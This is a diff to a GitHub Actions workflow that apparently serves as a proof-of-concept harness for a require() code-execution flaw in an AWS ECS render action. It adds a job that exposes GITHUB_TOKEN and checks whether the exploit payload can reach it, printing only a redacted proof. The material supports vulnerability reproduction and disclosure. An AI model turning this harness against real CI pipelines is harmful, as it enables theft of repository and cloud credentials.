@@ -34,3 +34,37 @@ jobs:
             echo "RCE_PROOF missing, exploit did not fire"
             exit 1
           fi
+
+  # Second job: same require() RCE, but this job also carries a token in
+  # process.env (a common pattern for workflows that also call the gh CLI, or
+  # that pair this action with configure-aws-credentials for OIDC in the same
+  # job). Shows the require()'d payload can reach that credential material,
+  # not only that arbitrary code executed. Only a redacted proof (presence +
+  # length + sha256 prefix) is ever written or printed, never the raw secret.
+  secret-reach:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: pre-check (no proof yet)
+        run: |
+          test -f SECRET_REACH_PROOF && { echo "FAIL: proof already present"; exit 1; } || echo "ok, no proof file yet"
+
+      - name: run vulnerable action against secrets-reach payload
+        uses: aws-actions/amazon-ecs-render-task-definition@v1
+        with:
+          task-definition: task-definition-secrets.json
+          container-name: web
+          image: example:latest
+
+      - name: post-check (redacted proof the payload could see job secrets)
+        run: |
+          if [ -f SECRET_REACH_PROOF ]; then
+            echo "SECRET REACHABILITY CONFIRMED (redacted, no raw values):"
+            cat SECRET_REACH_PROOF
+          else
+            echo "SECRET_REACH_PROOF missing, exploit did not fire"
+            exit 1
+          fi
